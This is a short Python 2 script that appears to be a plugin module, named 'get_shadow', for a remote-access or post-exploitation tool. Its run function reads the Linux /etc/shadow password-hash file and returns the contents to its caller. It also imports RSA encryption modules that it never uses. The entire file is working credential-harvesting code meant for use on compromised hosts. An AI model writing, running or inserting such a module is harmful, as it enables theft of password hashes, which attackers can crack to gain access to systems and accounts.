#!/usr/bin/python

import os
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import Crypto.Hash.SHA
def run(id, *args):
    print "[->] In get_shadow module."
    try:
        with open("/etc/shadow") as file_object:
            content = file_object.read()
            file_object.close()
            
        return content

    except Exception, e:
        print "\t[!] %s" % str(e)
   
    return None
